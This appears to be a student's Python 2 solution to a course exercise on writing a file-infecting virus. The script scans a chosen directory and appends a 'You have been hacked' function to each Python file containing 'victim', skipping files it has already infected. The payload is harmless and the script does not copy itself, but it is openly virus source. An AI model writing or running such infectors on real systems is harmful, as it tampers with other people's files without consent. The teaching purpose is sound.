#!/usr/bin/env python2

# Virus should infect Python scripts containing the string "victim" (single or double quotes)
# by copying itself into their source code.
# You receive no points at all if other files are changed!
# Start with a naive implementation and improve it over time. Additionally, take care of the following issues:
#   Avoid disrupting the semantics of the infected files.
#   Avoid multiple infections of the same file.
#   Avoid long run-time by infecting only a fraction of the files.
#   Avoid infecting yourself ;)
#   Provide a working instance of your virus and a documentation

import collections
import argparse
import os
import glob
import sys

def main():
    parser = buildParser()
    args = parser.parse_args()
    dirToInfect = getParserArgs(args)
    if dirToInfect == "":
        print ("Please enter a directory to infect.")
        sys.exit()

    for filename in glob.glob(os.path.join(dirToInfect, '*.py')):
        if 'virus.py' not in filename:
            with open(filename) as f:
                program = f.readlines()
                isFileToInfect = False
                alreadyInfected = False
                for line in program:
                    if "'victim'" in line:
                        isFileToInfect = True
                        # print ("file:" + filename + ", line: " + line)
                    elif '"victim"' in line:
                        isFileToInfect = True
                        # print ("file:" + filename + ", line: " + line)
                    elif 'def virusAdded ():' in line:
                        alreadyInfected = True
            f.close()
            if isFileToInfect and alreadyInfected == False:
                print ("File:" + filename)
                program.append("\n")
                program.append("\n")
                program.append("def virusAdded ():\n")
                program.append("    print ('You have been hacked')\n")
                with open(filename, 'w') as overwriteFile:
                    overwriteFile.writelines(program)
                    overwriteFile.close()

def buildParser():
    parser = argparse.ArgumentParser(description="virus")
    parser.add_argument('-d', metavar='d', nargs='+', help='Directory of files to infect.')
    return parser

def getParserArgs(args):
    d = args.d[0]
    return d

if __name__ == "__main__":
    main()
